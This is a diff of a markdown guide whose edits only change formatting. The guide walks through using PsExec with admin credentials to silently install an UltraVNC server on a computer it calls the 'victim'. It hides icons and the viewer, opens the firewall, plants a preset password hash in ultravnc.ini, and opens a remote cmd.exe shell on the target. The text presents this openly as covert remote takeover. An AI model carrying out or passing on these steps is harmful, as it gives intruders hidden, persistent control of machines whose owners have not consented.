@@ -16,10 +16,9 @@ Copy current version of ultravnc from the website to your computer as **"c:\\uvn
 
 To start silent installation on victim computer run **"uvncsetup.exe"** as remotely using **PsExec.exe** below. The command copy the specified executable (uvncsetup.exe) to the remote system for execution:
 
-` psexec \\\victim -u admin -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,stopservice" /DIR="%programfiles%\uvnc"
+> psexec \\\victim -u admin -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,stopservice" /DIR="%programfiles%\uvnc"
 
-
- The inno setup parameters above allow the installation to complete silently. The installation files will be saved in the **"%program files%\uvnc"** directory on victim computer.
+The inno setup parameters above allow the installation to complete silently. The installation files will be saved in the **"%program files%\uvnc"** directory on victim computer.
 
 ## Step 4: Define new password 
 
@@ -28,8 +27,8 @@ UltraVNC password is "**admin0**" defined in **ultravnc.ini**. The ini file cont
 
 `
  [ultravnc]
- passwd=56B6ACA18D1BA76008
- passwd2=56B6ACA18D1BA76008
+  passwd=56B6ACA18D1BA76008
+  passwd2=56B6ACA18D1BA76008
 `
 
 Copy the file to **"%programfiles%\uvnc"** folder on victim computer.
@@ -38,7 +37,7 @@ Copy the file to **"%programfiles%\uvnc"** folder on victim computer.
 
 Start the service for the password to take effect. To restart the service open an interactive remote shell to victim computer below:
 
-` psexec \\victim -u admin -p admin0 -h -i cmd.exe
+> psexec \\victim -u admin -p admin0 -h -i cmd.exe
 
 And run below command over remote shell:
 
